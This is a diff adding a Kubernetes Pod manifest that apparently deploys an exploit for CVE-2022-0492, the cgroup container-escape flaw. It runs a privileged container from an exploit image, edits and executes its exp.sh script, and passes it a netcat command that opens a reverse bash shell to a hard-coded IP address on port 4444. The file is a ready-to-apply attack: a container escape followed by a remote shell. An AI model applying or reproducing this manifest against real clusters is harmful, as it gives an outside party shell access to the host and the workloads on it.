@@ -1,0 +1,12 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: cgroup-exp
+spec:
+  containers:
+  - name: cgroup-exp
+    image: yaoyinnan/cve-2022-0492:latest
+    securityContext:
+      privileged: true
+    command: ["/bin/sh"]
+    args: ["-c", "sed -i \"s|/etc/mtab|/proc/self/mounts|g\" exp.sh; chmod +x exp.sh && ./exp.sh 'nc -e /bin/bash 10.113.107.65 4444'; sleep infinity"]
